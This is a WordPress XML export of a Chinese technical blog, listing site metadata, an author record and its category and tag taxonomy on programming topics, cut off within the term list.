<?xml version="1.0" encoding="UTF-8" ?>
<!-- This is a WordPress eXtended RSS file generated by WordPress as an export of your site. -->
<!-- It contains information about your site's posts, pages, comments, categories, and other content. -->
<!-- You may use this file to transfer that content from one site to another. -->
<!-- This file is not intended to serve as a complete backup of your site. -->

<!-- To import this information into a WordPress site follow these steps: -->
<!-- 1. Log in to that site as an administrator. -->
<!-- 2. Go to Tools: Import in the WordPress admin panel. -->
<!-- 3. Install the "WordPress" importer from the list. -->
<!-- 4. Activate & Run Importer. -->
<!-- 5. Upload this file using the form provided on that page. -->
<!-- 6. You will first be asked to map the authors in this export file to users -->
<!--    on the site. For each author, you may choose to map to an -->
<!--    existing user on the site or to create a new user. -->
<!-- 7. WordPress will then import each of the posts, pages, comments, categories, etc. -->
<!--    contained in this file into your site. -->

	<!-- generator="WordPress/5.2.4" created="2019-11-25 14:35" -->
<rss version="2.0"
	xmlns:excerpt="http://wordpress.org/export/1.2/excerpt/"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:wp="http://wordpress.org/export/1.2/"
>

<channel>
	<title>Veitor的技术点滴</title>
	<link>http://wp.veitor.net</link>
	<description>又一个WordPress站点</description>
	<pubDate>Mon, 25 Nov 2019 14:35:14 +0000</pubDate>
	<language>zh-CN</language>
	<wp:wxr_version>1.2</wp:wxr_version>
	<wp:base_site_url>http://wp.veitor.net</wp:base_site_url>
	<wp:base_blog_url>http://wp.veitor.net</wp:base_blog_url>

		<wp:author><wp:author_id>1</wp:author_id><wp:author_login><![CDATA[admin]]></wp:author_login><wp:author_email><![CDATA[dandankele@vip.qq.com]]></wp:author_email><wp:author_display_name><![CDATA[admin]]></wp:author_display_name><wp:author_first_name><![CDATA[]]></wp:author_first_name><wp:author_last_name><![CDATA[]]></wp:author_last_name></wp:author>

		<wp:category>
		<wp:term_id>5</wp:term_id>
		<wp:category_nicename><![CDATA[js]]></wp:category_nicename>
		<wp:category_parent><![CDATA[]]></wp:category_parent>
		<wp:cat_name><![CDATA[JS]]></wp:cat_name>
	</wp:category>
		<wp:category>
		<wp:term_id>10</wp:term_id>
		<wp:category_nicename><![CDATA[mysql-2]]></wp:category_nicename>
		<wp:category_parent><![CDATA[]]></wp:category_parent>
		<wp:cat_name><![CDATA[Mysql]]></wp:cat_name>
	</wp:category>
		<wp:category>
		<wp:term_id>2</wp:term_id>
		<wp:category_nicename><![CDATA[php]]></wp:category_nicename>
		<wp:category_parent><![CDATA[]]></wp:category_parent>
		<wp:cat_name><![CDATA[PHP]]></wp:cat_name>
	</wp:category>
		<wp:category>
		<wp:term_id>11</wp:term_id>
		<wp:category_nicename><![CDATA[python-bianchengyuyan]]></wp:category_nicename>
		<wp:category_parent><![CDATA[]]></wp:category_parent>
		<wp:cat_name><![CDATA[Python]]></wp:cat_name>
	</wp:category>
		<wp:category>
		<wp:term_id>1</wp:term_id>
		<wp:category_nicename><![CDATA[uncategorized]]></wp:category_nicename>
		<wp:category_parent><![CDATA[]]></wp:category_parent>
		<wp:cat_name><![CDATA[未分类]]></wp:cat_name>
	</wp:category>
		<wp:category>
		<wp:term_id>6</wp:term_id>
		<wp:category_nicename><![CDATA[jiagou]]></wp:category_nicename>
		<wp:category_parent><![CDATA[]]></wp:category_parent>
		<wp:cat_name><![CDATA[架构]]></wp:cat_name>
	</wp:category>
		<wp:category>
		<wp:term_id>7</wp:term_id>
		<wp:category_nicename><![CDATA[chengxuyushenghuo]]></wp:category_nicename>
		<wp:category_parent><![CDATA[]]></wp:category_parent>
		<wp:cat_name><![CDATA[程序与生活]]></wp:cat_name>
	</wp:category>
		<wp:category>
		<wp:term_id>9</wp:term_id>
		<wp:category_nicename><![CDATA[jingyanfengxiang]]></wp:category_nicename>
		<wp:category_parent><![CDATA[]]></wp:category_parent>
		<wp:cat_name><![CDATA[经验分享]]></wp:cat_name>
	</wp:category>
		<wp:category>
		<wp:term_id>8</wp:term_id>
		<wp:category_nicename><![CDATA[bianchengyuyan]]></wp:category_nicename>
		<wp:category_parent><![CDATA[]]></wp:category_parent>
		<wp:cat_name><![CDATA[编程语言]]></wp:cat_name>
	</wp:category>
		<wp:category>
		<wp:term_id>4</wp:term_id>
		<wp:category_nicename><![CDATA[xitong]]></wp:category_nicename>
		<wp:category_parent><![CDATA[]]></wp:category_parent>
		<wp:cat_name><![CDATA[计算机系统]]></wp:cat_name>
	</wp:category>
		<wp:category>
		<wp:term_id>3</wp:term_id>
		<wp:category_nicename><![CDATA[sjms]]></wp:category_nicename>
		<wp:category_parent><![CDATA[]]></wp:category_parent>
		<wp:cat_name><![CDATA[设计模式]]></wp:cat_name>
	</wp:category>
			<wp:tag>
		<wp:term_id>63</wp:term_id>
		<wp:tag_slug><![CDATA[acid]]></wp:tag_slug>
		<wp:tag_name><![CDATA[ACID]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>52</wp:term_id>
		<wp:tag_slug><![CDATA[ascii]]></wp:tag_slug>
		<wp:tag_name><![CDATA[ASCII]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>65</wp:term_id>
		<wp:tag_slug><![CDATA[c]]></wp:tag_slug>
		<wp:tag_name><![CDATA[C]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>80</wp:term_id>
		<wp:tag_slug><![CDATA[cqrs]]></wp:tag_slug>
		<wp:tag_name><![CDATA[CQRS]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>22</wp:term_id>
		<wp:tag_slug><![CDATA[crypt]]></wp:tag_slug>
		<wp:tag_name><![CDATA[crypt]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>41</wp:term_id>
		<wp:tag_slug><![CDATA[csrf]]></wp:tag_slug>
		<wp:tag_name><![CDATA[csrf]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>29</wp:term_id>
		<wp:tag_slug><![CDATA[css]]></wp:tag_slug>
		<wp:tag_name><![CDATA[css]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>78</wp:term_id>
		<wp:tag_slug><![CDATA[ddd]]></wp:tag_slug>
		<wp:tag_name><![CDATA[ddd]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>72</wp:term_id>
		<wp:tag_slug><![CDATA[dns]]></wp:tag_slug>
		<wp:tag_name><![CDATA[DNS]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>81</wp:term_id>
		<wp:tag_slug><![CDATA[event-sourcing]]></wp:tag_slug>
		<wp:tag_name><![CDATA[Event Sourcing]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>82</wp:term_id>
		<wp:tag_slug><![CDATA[event-store]]></wp:tag_slug>
		<wp:tag_name><![CDATA[Event Store]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>70</wp:term_id>
		<wp:tag_slug><![CDATA[flash]]></wp:tag_slug>
		<wp:tag_name><![CDATA[flash]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>28</wp:term_id>
		<wp:tag_slug><![CDATA[google]]></wp:tag_slug>
		<wp:tag_name><![CDATA[google]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>67</wp:term_id>
		<wp:tag_slug><![CDATA[http]]></wp:tag_slug>
		<wp:tag_name><![CDATA[HTTP]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>76</wp:term_id>
		<wp:tag_slug><![CDATA[iphone]]></wp:tag_slug>
		<wp:tag_name><![CDATA[iphone]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>34</wp:term_id>
		<wp:tag_slug><![CDATA[linux]]></wp:tag_slug>
		<wp:tag_name><![CDATA[Linux]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>39</wp:term_id>
		<wp:tag_slug><![CDATA[mysql]]></wp:tag_slug>
		<wp:tag_name><![CDATA[mysql]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>64</wp:term_id>
		<wp:tag_slug><![CDATA[pdo]]></wp:tag_slug>
		<wp:tag_name><![CDATA[PDO]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>69</wp:term_id>
		<wp:tag_slug><![CDATA[pear]]></wp:tag_slug>
		<wp:tag_name><![CDATA[pear]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>14</wp:term_id>
		<wp:tag_slug><![CDATA[php]]></wp:tag_slug>
		<wp:tag_name><![CDATA[PHP]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>57</wp:term_id>
		<wp:tag_slug><![CDATA[pip]]></wp:tag_slug>
		<wp:tag_name><![CDATA[pip]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>56</wp:term_id>
		<wp:tag_slug><![CDATA[python]]></wp:tag_slug>
		<wp:tag_name><![CDATA[python]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>42</wp:term_id>
		<wp:tag_slug><![CDATA[retina]]></wp:tag_slug>
		<wp:tag_name><![CDATA[retina]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>77</wp:term_id>
		<wp:tag_slug><![CDATA[safari]]></wp:tag_slug>
		<wp:tag_name><![CDATA[safari]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>71</wp:term_id>
		<wp:tag_slug><![CDATA[session]]></wp:tag_slug>
		<wp:tag_name><![CDATA[session]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>35</wp:term_id>
		<wp:tag_slug><![CDATA[shell]]></wp:tag_slug>
		<wp:tag_name><![CDATA[Shell]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>66</wp:term_id>
		<wp:tag_slug><![CDATA[sublime]]></wp:tag_slug>
		<wp:tag_name><![CDATA[sublime]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>31</wp:term_id>
		<wp:tag_slug><![CDATA[svn]]></wp:tag_slug>
		<wp:tag_name><![CDATA[SVN]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>53</wp:term_id>
		<wp:tag_slug><![CDATA[unicode]]></wp:tag_slug>
		<wp:tag_name><![CDATA[unicode]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>32</wp:term_id>
		<wp:tag_slug><![CDATA[unix]]></wp:tag_slug>
		<wp:tag_name><![CDATA[Unix]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>33</wp:term_id>
		<wp:tag_slug><![CDATA[url]]></wp:tag_slug>
		<wp:tag_name><![CDATA[URL]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>54</wp:term_id>
		<wp:tag_slug><![CDATA[utf-8]]></wp:tag_slug>
		<wp:tag_name><![CDATA[UTF-8]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>51</wp:term_id>
		<wp:tag_slug><![CDATA[xhprof]]></wp:tag_slug>
		<wp:tag_name><![CDATA[xhprof]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>40</wp:term_id>
		<wp:tag_slug><![CDATA[xss]]></wp:tag_slug>
		<wp:tag_name><![CDATA[xss]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>18</wp:term_id>
		<wp:tag_slug><![CDATA[yii]]></wp:tag_slug>
		<wp:tag_name><![CDATA[Yii]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>74</wp:term_id>
		<wp:tag_slug><![CDATA[%e4%ba%8b%e4%bb%b6]]></wp:tag_slug>
		<wp:tag_name><![CDATA[事件]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>44</wp:term_id>
		<wp:tag_slug><![CDATA[%e4%ba%8b%e5%8a%a1]]></wp:tag_slug>
		<wp:tag_name><![CDATA[事务]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>26</wp:term_id>
		<wp:tag_slug><![CDATA[%e4%ba%ba%e5%b7%a5%e6%99%ba%e8%83%bd]]></wp:tag_slug>
		<wp:tag_name><![CDATA[人工智能]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>45</wp:term_id>
		<wp:tag_slug><![CDATA[%e4%bc%98%e9%85%b7]]></wp:tag_slug>
		<wp:tag_name><![CDATA[优酷]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>60</wp:term_id>
		<wp:tag_slug><![CDATA[%e4%bd%93%e9%aa%8c]]></wp:tag_slug>
		<wp:tag_name><![CDATA[体验]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>16</wp:term_id>
		<wp:tag_slug><![CDATA[%e5%88%86%e5%b8%83%e5%bc%8f]]></wp:tag_slug>
		<wp:tag_name><![CDATA[分布式]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>30</wp:term_id>
		<wp:tag_slug><![CDATA[%e5%89%8d%e7%ab%af]]></wp:tag_slug>
		<wp:tag_name><![CDATA[前端]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>23</wp:term_id>
		<wp:tag_slug><![CDATA[%e5%8a%a0%e5%af%86]]></wp:tag_slug>
		<wp:tag_name><![CDATA[加密]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>46</wp:term_id>
		<wp:tag_slug><![CDATA[%e5%8e%9f%e7%a0%81]]></wp:tag_slug>
		<wp:tag_name><![CDATA[原码]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>48</wp:term_id>
		<wp:tag_slug><![CDATA[%e5%8f%8d%e7%a0%81]]></wp:tag_slug>
		<wp:tag_name><![CDATA[反码]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>73</wp:term_id>
		<wp:tag_slug><![CDATA[%e5%90%8e%e7%ab%af]]></wp:tag_slug>
		<wp:tag_name><![CDATA[后端]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>37</wp:term_id>
		<wp:tag_slug><![CDATA[%e5%93%8d%e5%ba%94%e5%bc%8f]]></wp:tag_slug>
		<wp:tag_name><![CDATA[响应式]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>62</wp:term_id>
		<wp:tag_slug><![CDATA[%e5%ad%98%e5%82%a8%e5%bc%95%e6%93%8e]]></wp:tag_slug>
		<wp:tag_name><![CDATA[存储引擎]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>61</wp:term_id>
		<wp:tag_slug><![CDATA[%e5%b9%b6%e5%8f%91]]></wp:tag_slug>
		<wp:tag_name><![CDATA[并发]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>83</wp:term_id>
		<wp:tag_slug><![CDATA[%e5%be%ae%e6%9c%8d%e5%8a%a1]]></wp:tag_slug>
		<wp:tag_name><![CDATA[微服务]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>59</wp:term_id>
		<wp:tag_slug><![CDATA[%e6%8e%88%e6%9d%83]]></wp:tag_slug>
		<wp:tag_name><![CDATA[授权]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>50</wp:term_id>
		<wp:tag_slug><![CDATA[%e6%95%b0%e5%ad%a6]]></wp:tag_slug>
		<wp:tag_name><![CDATA[数学]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>25</wp:term_id>
		<wp:tag_slug><![CDATA[%e6%9e%b6%e6%9e%84]]></wp:tag_slug>
		<wp:tag_name><![CDATA[架构]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>19</wp:term_id>
		<wp:tag_slug><![CDATA[%e6%a8%a1%e6%9d%bf]]></wp:tag_slug>
		<wp:tag_name><![CDATA[模板]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>12</wp:term_id>
		<wp:tag_slug><![CDATA[%e7%ba%bf%e7%a8%8b]]></wp:tag_slug>
		<wp:tag_name><![CDATA[线程]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>55</wp:term_id>
		<wp:tag_slug><![CDATA[%e7%bc%96%e7%a0%81]]></wp:tag_slug>
		<wp:tag_name><![CDATA[编码]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>68</wp:term_id>
		<wp:tag_slug><![CDATA[%e7%bd%91%e7%bb%9c]]></wp:tag_slug>
		<wp:tag_name><![CDATA[网络]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>36</wp:term_id>
		<wp:tag_slug><![CDATA[%e8%87%aa%e9%80%82%e5%ba%94]]></wp:tag_slug>
		<wp:tag_name><![CDATA[自适应]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>75</wp:term_id>
		<wp:tag_slug><![CDATA[%e8%8b%b1%e8%af%ad]]></wp:tag_slug>
		<wp:tag_name><![CDATA[英语]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>20</wp:term_id>
		<wp:tag_slug><![CDATA[%e8%8f%9c%e5%8d%95]]></wp:tag_slug>
		<wp:tag_name><![CDATA[菜单]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>47</wp:term_id>
		<wp:tag_slug><![CDATA[%e8%a1%a5%e7%a0%81]]></wp:tag_slug>
		<wp:tag_name><![CDATA[补码]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>27</wp:term_id>
		<wp:tag_slug><![CDATA[%e8%a7%84%e8%8c%83]]></wp:tag_slug>
		<wp:tag_name><![CDATA[规范]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>58</wp:term_id>
		<wp:tag_slug><![CDATA[%e8%ae%a4%e8%af%81]]></wp:tag_slug>
		<wp:tag_name><![CDATA[认证]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>24</wp:term_id>
		<wp:tag_slug><![CDATA[%e8%ae%be%e8%ae%a1%e6%a8%a1%e5%bc%8f]]></wp:tag_slug>
		<wp:tag_name><![CDATA[设计模式]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>17</wp:term_id>
		<wp:tag_slug><![CDATA[%e8%b4%9f%e8%bd%bd]]></wp:tag_slug>
		<wp:tag_name><![CDATA[负载]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>38</wp:term_id>
		<wp:tag_slug><![CDATA[%e8%b7%af%e5%be%84]]></wp:tag_slug>
		<wp:tag_name><![CDATA[路径]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>49</wp:term_id>
		<wp:tag_slug><![CDATA[%e8%bd%ac%e8%bd%bd]]></wp:tag_slug>
		<wp:tag_name><![CDATA[转载]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>84</wp:term_id>
		<wp:tag_slug><![CDATA[%e8%bf%90%e7%bb%b4]]></wp:tag_slug>
		<wp:tag_name><![CDATA[运维]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>13</wp:term_id>
		<wp:tag_slug><![CDATA[%e8%bf%9b%e7%a8%8b]]></wp:tag_slug>
		<wp:tag_name><![CDATA[进程]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>43</wp:term_id>
		<wp:tag_slug><![CDATA[%e9%80%82%e9%85%8d]]></wp:tag_slug>
		<wp:tag_name><![CDATA[适配]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>15</wp:term_id>
		<wp:tag_slug><![CDATA[%e9%9b%86%e7%be%a4]]></wp:tag_slug>
		<wp:tag_name><![CDATA[集群]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>21</wp:term_id>
		<wp:tag_slug><![CDATA[%e9%a2%84%e5%8a%a0%e8%bd%bd]]></wp:tag_slug>
		<wp:tag_name><![CDATA[预加载]]></wp:tag_name>
	</wp:tag>
		<wp:tag>
		<wp:term_id>79</wp:term_id>
		<wp:tag_slug><![CDATA[%e9%a2%86%e5%9f%9f%e9%a9%b1%e5%8a%a8%e8%ae%be%e8%ae%a1]]></wp:tag_slug>
		<wp:tag_name><![CDATA[领域驱动设计]]></wp:tag_name>
	</wp:tag>
			<wp:term>
		<wp:term_id><![CDATA[63]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[acid]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[ACID]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[52]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[ascii]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[ASCII]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[65]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[c]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[C]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[80]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[cqrs]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[CQRS]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[22]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[crypt]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[crypt]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[41]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[csrf]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[csrf]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[29]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[css]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[css]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[78]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[ddd]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[ddd]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[72]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[dns]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[DNS]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[81]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[event-sourcing]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Event Sourcing]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[82]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[event-store]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Event Store]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[70]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[flash]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[flash]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[28]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[google]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[google]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[67]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[http]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[HTTP]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[76]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[iphone]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[iphone]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[5]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[js]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[JS]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[34]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[linux]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Linux]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[10]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[mysql-2]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Mysql]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[39]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[mysql]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[mysql]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[64]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[pdo]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[PDO]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[69]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[pear]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[pear]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[2]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[php]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[PHP]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[14]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[php]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[PHP]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[57]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[pip]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[pip]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[11]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[python-bianchengyuyan]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Python]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[56]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[python]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[python]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[42]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[retina]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[retina]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[77]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
